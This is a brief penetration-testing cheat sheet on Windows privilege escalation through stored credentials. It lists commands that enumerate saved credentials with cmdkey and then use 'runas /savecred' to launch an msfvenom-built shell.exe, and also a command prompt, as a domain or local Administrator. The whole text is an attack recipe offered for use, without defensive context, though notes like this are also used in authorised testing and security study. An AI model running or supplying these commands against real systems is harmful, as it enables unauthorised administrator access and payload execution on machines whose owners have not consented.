# Runas Stored Credentials

## Checking for Stored Credentaisl
```
cmdkey /list
```

## Running AS with msfvenom
```
runas /savecred /user:DOM.LOCAL\Administrator "C:\Users\<user>\Documents\shell.exe"
```

## Runnng AS with local commands
```
runas /savecred /user:DOM.LOCAL\Administrator "c:\windows\system32\cmd.exe /k whoami"
runas /savecred /user:admin cmd.exe
```